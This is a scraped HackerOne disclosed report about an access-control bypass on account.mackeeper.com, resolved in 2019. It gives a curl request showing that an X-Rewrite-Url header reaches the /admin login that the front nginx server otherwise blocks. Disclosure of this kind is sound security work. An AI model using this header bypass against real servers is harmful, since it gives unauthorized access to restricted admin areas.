---
title: "Bypass front server restrictions and access to forbidden files and directories through X-Rewrite-Url/X-original-url header on account.mackeeper.com"
author: rumiljonov
url: https://hackerone.com/reports/737323
date_published: 2019-11-14
date_scraped: 2026-11-17
platform: hackerone
disclosed_report: https://hackerone.com/reports/737323
bounty: $300
vuln_class: access-control
---

<!-- Raw scraped text below. Public, non-paywalled content only. -->

Report #737323 | Reported to Clario | Status: Resolved | Severity: Medium (6.1) | Weakness: Misconfiguration | Bounty: $300 (awarded Nov 22, 2019) | Reported: November 14, 2019, 12:09pm UTC | Disclosed: May 15, 2020

Note: the public page shows only the "Summary by Clario" body; individual timeline comments (jair, cardb0ard_box, rumiljonov) did not render text.

## Summary by Clario

### Summary

Normally a client can't access /admin directory because of front nginx server which returns 403. But we can use X-Rewrite-Url or X-original-url because back server processes these headers and front server doesn't.

### Steps to reproduce:

This request shows normal behavior
`curl -i -s -k -X $'GET' -H $'Host: account.mackeeper.com' $'https://account.mackeeper.com/admin/login'`
and returns 403

Here you can see how we can bypass these restrictions
`curl -i -s -k -X $'GET' -H $'Host: account.mackeeper.com' -H $'X-rewrite-url: admin/login' $'https://account.mackeeper.com/'`
and return login page

## Timeline (events only)

- Nov 14, 2019 12:09pm: rumiljonov submitted report. 1:27pm: jair posted a comment and changed status to Triaged.
- Nov 15, 2019: cardb0ard_box updated severity from medium to medium(6.1), changed the weakness, posted a comment.
- Nov 22, 2019: rumiljonov comment. Nov 25, 2019: Clario rewarded rumiljonov with a $300 bounty; further comments by rumiljonov and jair.
- Feb 4, 2020: hackbot closed report as Resolved.
- May 15, 2020: jair requested disclosure; rumiljonov agreed; report disclosed.
